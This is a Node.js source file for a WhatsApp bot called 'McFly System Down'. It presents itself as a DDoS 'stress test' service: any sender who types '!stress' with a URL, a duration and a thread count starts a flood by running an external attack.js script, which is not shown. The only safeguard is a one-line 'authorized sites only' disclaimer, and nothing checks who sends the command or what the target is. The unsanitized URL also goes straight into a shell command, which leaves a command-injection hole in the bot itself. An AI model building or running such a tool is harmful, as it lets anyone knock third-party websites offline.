const { default: makeWASocket, useSingleFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');

const { state, saveState } = useSingleFileAuthState('./auth.json');

const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
});

sock.ev.on('creds.update', saveState);

sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if(connection === 'close') {
        const shouldReconnect = (lastDisconnect.error instanceof Boom) 
            ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut
            : true;
        console.log('Conexão fechada devido a', lastDisconnect.error, ', reconectando...', shouldReconnect);
        if(shouldReconnect) {
            startSock();
        }
    } else if(connection === 'open') {
        console.log('Conexão aberta');
    }
});

sock.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0];
    if (!m.message) return;

    const msg = m.message.conversation || m.message.extendedTextMessage?.text || '';
    const sender = m.key.remoteJid;

    console.log('Mensagem recebida:', msg);

    if (msg.toLowerCase() === '!start') {
        await sock.sendMessage(sender, {
            text: 
`🔥 *McFly System Down*

👨‍💻 Sou um bot de *testes de stress* DDoS.

🛠️ *Comando disponível:*

➤ !stress (url) (tempo-em-segundos) (quantidade-de-threads)

🧠 *Exemplo:*
!stress https://seusite.com 60 50

🚫 *Limites:*
- Tempo máximo: 600 segundos
- Threads máximas: 800

⚠️ *Uso exclusivo para testes em sites autorizados pela sua equipe.*`
        });
    }

    if (msg.startsWith('!stress')) {
        const args = msg.split(' ');

        if (args.length !== 4) {
            await sock.sendMessage(sender, { text: '❌ Formato inválido!\n✅ Exemplo correto:\n!stress https://site.com 60 50' });
            return;
        }

        const url = args[1];
        const tempo = parseInt(args[2]);
        const threads = parseInt(args[3]);

        if (isNaN(tempo) || isNaN(threads)) {
            await sock.sendMessage(sender, { text: '❌ Tempo e Threads devem ser números!' });
            return;
        }

        if (tempo > 600) {
            await sock.sendMessage(sender, { text: '❌ Tempo máximo permitido é 600 segundos!' });
            return;
        }

        if (threads > 800) {
            await sock.sendMessage(sender, { text: '❌ Máximo de threads permitido é 800!' });
            return;
        }

        await sock.sendMessage(sender, { text: `🚀 Ataque iniciado em: ${url} \n⏳ Duração: ${tempo}s \n💥 Threads: ${threads}` });

        exec(`node attack.js ${url} ${tempo} ${threads}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Erro: ${error.message}`);
                sock.sendMessage(sender, { text: `❌ Ocorreu um erro ao iniciar o ataque.` });
                return;
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
            }
            console.log(`stdout: ${stdout}`);
        });
    }
});
